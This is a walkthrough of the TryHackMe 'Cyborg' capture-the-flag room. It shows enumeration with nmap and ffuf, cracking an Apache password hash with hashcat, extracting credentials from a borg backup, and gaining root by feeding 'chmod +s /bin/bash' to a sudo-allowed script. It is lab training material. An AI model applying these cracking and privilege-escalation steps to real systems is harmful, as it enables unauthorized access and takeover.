# Cyborg (THM)

- https://tryhackme.com/room/cyborgt8
- March 4, 2023
- easy

---

## Enumeration

### Nmap Initial

1. 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
2. 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))

### http

- directory brute forcing with ffuf

```
admin [Status: 301, Size: 314, Words: 20, Lines: 10]
etc   [Status: 301, Size: 312, Words: 20, Lines: 10]
```

#### Admin

- Download archive.tar from http://$IP/admin/archive.tar

- http://$IP/admin/admin.html

```
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
```

- unzip the tar file and in README file, it is said borgbackup.
- in borgbackup documentation, find the extract command
- https://borgbackup.readthedocs.io/en/stable/usage/extract.html

```sh
borg extract /path/to/repo::my-files
```

#### etc

- found two files

  - passwd, squid.conf

- crack apr (Apache) with hashcat and found password

```sh
$ hashcat -m 1600 music_hashes /usr/share/wordlists/rockyou.txt
# $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

- it may be password for borg archive

```sh
$ borg extract archive/home/field/dev/final_archive::music_archive
# enter above password
```

- it will extract `home` folder
- /home/Documents/note.txt

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

## Get User Access

- enter ssh with above credentials

```sh
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh


alex@ubuntu:~$ ls -lah /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1.1K Dec 30  2020 /etc/mp3backups/backup.sh

alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
while getopts c: flag
do
	case "${flag}" in
		c) command=${OPTARG};;
	esac
done
backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```

- run the pspy64 and found that backup.sh file is running once per minute
- above script,

```sh
while getopts c: flag
do
	case "${flag}" in
		c) command=${OPTARG};;
	esac
done
...
cmd=$($command)
echo $cmd
```

## Get Root Access

- if backup.sh is run with -c flag, it will execute by root

```sh
alex@ubuntu:/tmp$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
alex@ubuntu:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
alex@ubuntu:/tmp$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /home/alex/user.txt
bash-4.3# cat /root/root.txt
```

---
